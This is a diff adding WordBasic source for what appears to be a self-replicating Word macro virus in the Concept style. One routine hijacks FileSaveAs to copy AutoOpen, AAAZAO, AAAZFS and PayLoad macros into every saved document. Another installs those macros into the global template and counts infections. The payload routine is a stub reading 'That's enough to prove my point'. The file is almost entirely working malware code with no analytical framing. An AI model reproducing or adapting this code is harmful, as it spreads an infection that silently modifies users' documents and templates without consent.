@@ -1,0 +1,61 @@
+Sub MAIN
+'this becomes the FileSaveAs for the global template
+   Dim dlg As FileSaveAs
+   On Error Goto bail
+   GetCurValues dlg
+   Dialog dlg
+
+   If dlg.Format = 0 Then dlg.Format = 1
+   sMe$ = FileName$()
+   sTMacro$ = sMe$ + ":AutoOpen"
+   MacroCopy "Global:AAAZAO", sTMacro$
+   sTMacro$ = sMe$ + ":AAAZAO"
+   MacroCopy "Global:AAAZAO", sTMacro$
+   sTMacro$ = sMe$ + ":AAAZFS"
+   MacroCopy "Global:AAAZFS", sTMacro$
+   sTMacro$ = sMe$ + ":PayLoad"
+   MacroCopy "Global:PayLoad", sTMacro$
+   FileSaveAs dlg
+   Goto Done
+ Bail:
+   If Err <> 102 Then
+          FileSaveAs dlg
+   End If
+ Done:
+End Sub
+-----------------------------------------------------
+ Sub MAIN
+   REM  That's enough to prove my point
+ End Sub
+-----------------------------------------------------
+ Sub MAIN
+        On Error Goto Abort
+        iMacroCount = CountMacros(0, 0)
+        'see if we're already installed
+        For i = 1 To iMacroCount
+                If MacroName$(i, 0, 0) = "PayLoad" Then
+                        bInstalled = - 1
+                End If
+                If MacroName$(i, 0, 0) = "FileSaveAs" Then
+                        bTooMuchTrouble = - 1
+                End If
+        Next i
+        If Not bInstalled And Not bTooMuchTrouble Then
+                'add FileSaveAs and copies of AutoOpen and FileSaveAs.
+                'PayLoad is just for fun.
+                iWW6IInstance = Val(GetDocumentVar$("WW6Infector"))
+                sMe$ = FileName$()
+                sMacro$ = sMe$ + ":Payload"
+                MacroCopy sMacro$, "Global:PayLoad"
+                sMacro$ = sMe$ + ":AAAZFS"
+                MacroCopy sMacro$, "Global:FileSaveAs"
+                sMacro$ = sMe$ + ":AAAZFS"
+                MacroCopy sMacro$, "Global:AAAZFS"
+                sMacro$ = sMe$ + ":AAAZAO"
+                MacroCopy sMacro$, "Global:AAAZAO"
+                SetProfileString "WW6I", Str$(iWW6IInstance + 1)
+                MsgBox Str$(iWW6IInstance + 1)
+        End If
+Abort:
+ End Sub
+-----------------------------------------------------
